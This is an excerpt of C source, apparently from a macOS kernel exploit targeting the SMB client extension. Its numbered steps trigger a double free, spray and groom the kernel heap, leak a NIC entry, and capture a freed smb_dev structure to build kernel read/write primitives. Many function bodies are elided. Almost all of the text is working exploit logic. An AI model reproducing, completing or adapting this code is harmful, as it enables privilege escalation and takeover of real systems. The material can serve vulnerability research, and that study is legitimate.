...
typedef struct smb_dev_rw_session_shared {
    _Atomic int ref_cnt;
    xpl_kheap_free_session_t dbf_session;
    xpl_allocator_prpw_t sockaddr_allocator;
    xpl_allocator_prpw_t sock_addr_entry_allocator;
} *smb_dev_rw_session_shared_t;


smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(xpl_kheap_free_session_t dbf_session) {
...
void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
    ...
    if (session->sock_addr_entry_allocator) {
        ...
        xpl_allocator_prpw_iter_backends(session->sock_addr_entry_allocator, ^(int fd) {
            xpl_safe_release_reset_client_nics(fd, slider);
        });
        xpl_allocator_prpw_destroy(&session->sock_addr_entry_allocator);
    }
    if (session->sockaddr_allocator) {
        /// Patch the `client_nic_info_list` to prevent NICs from being released
        xpl_allocator_prpw_iter_backends(session->sockaddr_allocator, ^(int fd) {
            xpl_safe_release_reset_client_nics(fd, slider);
        });
        xpl_allocator_prpw_destroy(&session->sockaddr_allocator);
    }
    xpl_slider_kext_destroy(&slider);
    free(session);
}
...
struct xpl_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, xpl_allocator_nrnw_t nrnw_allocator) {
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        ...
        if (sa_len == 48 && sa_family != AF_INET && sa_family != AF_INET6) {
            ...
            /// Stir the pot
            xpl_allocator_nrnw_allocate(nrnw_allocator, 48, random() % 128);
...
struct xpl_kheap_alloc_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
    uint8_t sa_len = (uint8_t)sock_addr;
    xpl_assert(sa_len == 48);
    uint8_t sa_family = (uint8_t)(sock_addr >> 8);
    xpl_assert(sa_family != AF_INET && sa_family != AF_INET6);
    ...
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct xpl_kheap_alloc_entry alloc = xpl_kheap_alloc(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2, 2);
        uintptr_t allocated_address = alloc.address;
        if (allocated_address % 32 == 0) {
            xpl_allocator_prpw_destroy(&alloc.element_allocator);
        } else {
            return alloc;
        }
    }
    xpl_log_error("failed to allocate sock_addr");
    xpl_abort();
}


void smb_dev_rw_fragment_kext_32(const struct sockaddr_in* smb_addr, xpl_allocator_nrnw_t nrnw_allocator) {
...
/// Create a `smb_dev_rw` from allocation of `xpl_allocator_rw_t` replaced by a `struct smb_dev`
struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_addr, int fd_dev, int fd_rw, smb_dev_rw_session_shared_t session) {
    ...
    /// Sometimes the `xpl_allocator_rw_t` allocation might get replaced by an allocation in
    ...
    xpl_log_debug_hexdump(&captured_smb_dev, sizeof(captured_smb_dev), "captured rw_allocator at fd: %d with data: ", fd_rw);
    ...
    if (!xpl_vm_kernel_address_valid((uintptr_t)captured_smb_dev.sd_devfs)) {
        goto bad;
    }
...
void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], const int* rw_fds, int* matched_captures, int num_rw_fds) {
    ...
    for (int capture_dev_idx=0; capture_dev_idx<NUM_SMB_DEV_CAPTURE_ALLOCS; capture_dev_idx++) {
        ...
        for (int rw_dev_idx = 0; rw_dev_idx<num_rw_fds; rw_dev_idx++) {
            ...
            /// Read the memory of `xpl_allocator_rw_t` allocation
...
void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[2]) {
    ...
    xpl_log_debug("allocated socket_address at %p", (void*)fake_sockaddr);
    
    xpl_kheap_free_session_t dbf_session = xpl_kheap_free_session_create(smb_addr);
    
    /// STEP 2: Leak the memory of a NIC entry (`struct complete_nic_info_entry`)
    struct complete_nic_info_entry dbf_nic = xpl_kheap_free_session_prepare(dbf_session);
    ...
    struct xpl_kheap_alloc_entry fake_sock_addr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, fake_sockaddr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
    uintptr_t fake_sock_addr_entry = fake_sock_addr_entry_alloc.address;
    xpl_log_debug("allocated sock_addr_entry at %p", (void*)fake_sock_addr_entry);
    
    xpl_allocator_rw_t capture_allocator = xpl_allocator_rw_create(smb_addr, NUM_DBF_CAPTURE_ALLOCS);
    ...
    xpl_assert_err(error);
    xpl_log_debug("double free complete");
    
    xpl_allocator_prpw_data_filter filter = ^_Bool(void* ctx, sa_family_t address_family, size_t idx) {
    ...
    /// spray in STEP 6
    error = xpl_allocator_prpw_filter(fake_sockaddr_alloc.element_allocator, 0, xpl_allocator_prpw_get_capacity(fake_sockaddr_alloc.element_allocator), filter, NULL, &sockaddr_found_index);
    xpl_assert_err(error);
    ...
    error = xpl_allocator_prpw_filter(fake_sock_addr_entry_alloc.element_allocator, 0, xpl_allocator_prpw_get_capacity(fake_sock_addr_entry_alloc.element_allocator), filter, NULL, &sock_addr_entry_found_index);
    xpl_assert_err(error);
    ...
    if (sock_addr_entry_found_index < 0 && sockaddr_found_index < 0) {
        ...
        xpl_log_warn("failed to capture fake_sock_addr_entry using rw allocator");
    } else if (sockaddr_found_index < 0) {
        xpl_log_warn("failed to capture fake_sockaddr using rw allocator");
    }
    ...
    /// `fake_sockaddr` is still being refrenced by allocations from `xpl_allocator_rw_t`, we can
    ...
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (idx == 0) {
            if (sock_addr_entry_found_index >= 0) {
                int error = xpl_allocator_prpw_release_containing_backend(fake_sock_addr_entry_alloc.element_allocator, sock_addr_entry_found_index);
                xpl_assert_err(error);
            }
            if (sockaddr_found_index >= 0) {
                int error = xpl_allocator_prpw_release_containing_backend(fake_sockaddr_alloc.element_allocator, sockaddr_found_index);
                xpl_assert_err(error);
            }
        }
        capture_smb_devs[idx] = smb_client_open_dev();
        xpl_assert(capture_smb_devs[idx] >= 0);
    });
    
    /// STEP 8: Filter out `xpl_allocator_rw_t` backends whose data changed. The memory allocated
    /// by these backends got released when a `xpl_allocator_prpw_t` backend was released
    /// in STEP 7
    int dev_rw_fds[num_slots];
    for (int i = 0; i<num_slots; i++) {
        int capture_idx = -1;
        /// Find out which allocation of `xpl_allocator_rw_t` got changed. `SMB_DEV_CAPTURE_DATA`
        /// is the data we used during allocation.
        int error = xpl_allocator_rw_filter(capture_allocator, 0, xpl_allocator_rw_get_backend_count(capture_allocator), 48, 0, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        ...
        if (capture_idx >= 0) {
            dev_rw_fds[i] = xpl_allocator_rw_disown_backend(capture_allocator, capture_idx);
    ...
    /// with `xpl_allocator_rw_t` backends filtered out in STEP 8
    ...
    xpl_assert_cond(num_slots, <=, 2);
    memset(dev_rws, 0, sizeof(smb_dev_rw_t) * 2);
    
    /// STEP 10: Create `smb_dev_rw` for each captured `xpl_allocator_rw_t` and smb_device
    ...
    xpl_allocator_rw_destroy(&capture_allocator);
...
int smb_dev_rw_write_data(smb_dev_rw_t dev, const struct smb_dev* data) {
    ...
    xpl_log_debug_hexdump(data, sizeof(*data), "writing smb_dev at %d with:", dev->fd_dev);
    
    xpl_allocator_rw_t capture_allocator = xpl_allocator_rw_create(&dev->smb_addr, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2);
    ...
    /// Set the `NSMBFS_CANCEL` flag. This can be used to identify which `xpl_allocator_rw_t`
    ...
    data_copy.sd_flags |= NSMBFL_CANCEL;
    /// Find out which `xpl_allocator_rw_t` backend replaced the `struct smb_dev`
    /// data of `fd_dev`
    int found_idx;
    error = xpl_allocator_rw_filter(capture_allocator, 0, xpl_allocator_rw_get_backend_count(capture_allocator), 48, 48, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        /// Each `xpl_allocator_rw_t` backend can allocate a pair of read write data
    ...
    if (found_idx < 0) {
        /// None of the `xpl_allocator_rw_t` backend allocations replaced the `struct smb_dev`
        ...
        dev->fd_dev = -1;
        error = EIO;
        xpl_log_debug("smb_dev_rw write failed");
    } else {
        dev->fd_rw = xpl_allocator_rw_disown_backend(capture_allocator, (int)found_idx);
        error = 0;
        xpl_log_debug("smb_dev_rw write ok");
    }
...
void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
    ...
    if (rw->fd_dev >= 0) {
        ...
        xpl_safe_release_restore_smb_dev(&rw->smb_addr, rw->fd_dev, &restore, rw->active, slider);
        close(rw->fd_dev);
    }

    if (rw->fd_rw >= 0) {
        xpl_safe_release_reset_auth_info(rw->fd_rw, slider);
        close(rw->fd_dev);
    }
